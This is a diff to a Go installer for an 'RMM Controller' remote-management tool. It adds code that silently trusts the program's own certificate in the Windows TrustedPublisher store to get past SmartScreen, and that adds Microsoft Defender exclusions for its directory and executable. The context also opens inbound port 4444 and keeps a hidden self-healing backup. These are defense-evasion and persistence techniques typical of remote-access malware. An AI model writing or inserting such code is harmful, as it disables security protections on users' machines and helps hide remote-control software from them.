@@ -55,6 +55,44 @@ func relaunchAsAdmin() {
 	os.Exit(0)
 }
 
+// trustPublisherCert installs our code-signing cert into TrustedPublisher
+// so SmartScreen/Smart App Control accept our signed binaries. Needs admin.
+func trustPublisherCert(dir string) {
+	cer := filepath.Join(dir, "RMM.cer")
+	if _, err := os.Stat(cer); err != nil {
+		fmt.Println("[!] publisher cert missing, SmartScreen may warn")
+		return
+	}
+	if out, err := exec.Command("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput(); err != nil {
+		fmt.Printf("[!] trust publisher cert: %v %s\n", err, strings.TrimSpace(string(out)))
+		return
+	}
+	fmt.Println("[*] Publisher cert trusted")
+}
+
+// addDefenderExclusions keeps Defender from quarantining our install dir +
+// exe. Best effort: fails silently when Defender is absent, managed, or
+// Tamper Protection blocks it.
+func addDefenderExclusions(paths ...string) {
+	for _, p := range paths {
+		q := strings.ReplaceAll(p, "'", "''")
+		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		if strings.HasSuffix(strings.ToLower(p), ".exe") {
+			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		}
+	}
+}
+
+func removeDefenderExclusions(paths ...string) {
+	for _, p := range paths {
+		q := strings.ReplaceAll(p, "'", "''")
+		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		if strings.HasSuffix(strings.ToLower(p), ".exe") {
+			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		}
+	}
+}
+
 func doUninstall() {
 	programFiles := os.Getenv("ProgramFiles")
 	if programFiles == "" {
@@ -77,6 +115,7 @@ func doUninstall() {
 	_ = os.Remove(filepath.Join(desktop, "Controller.lnk"))
 	_ = os.Remove(filepath.Join(os.Getenv("ProgramData"), `Microsoft\Windows\Start Menu\Programs\RMM Controller.lnk`))
 	_, _ = exec.Command("netsh", "advfirewall", "firewall", "delete", "rule", "name=RMM Controller").CombinedOutput()
+	removeDefenderExclusions(installDir, filepath.Join(installDir, "controller-native.exe"))
 	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\RMM Controller`)
 	// Clean up backup directory (controller files share blender/ with agent backup;
 	// only remove controller-owned files, never the whole dir).
@@ -213,6 +252,11 @@ func main() {
 	fmt.Println("[*] Adding firewall rule...")
 	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "protocol=TCP", "localport=4444").CombinedOutput()
 	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "program="+target, "enable=yes").CombinedOutput()
+
+	// Unblock-friendly install: trust our publisher cert (SmartScreen) and
+	// ask Defender to leave our dir/exe alone (heuristic false positives).
+	trustPublisherCert(installDir)
+	addDefenderExclusions(installDir, target)
 
 	// Backup controller binaries to hidden directory for self-healing
 	fmt.Println("[*] Creating controller backup for self-healing...")
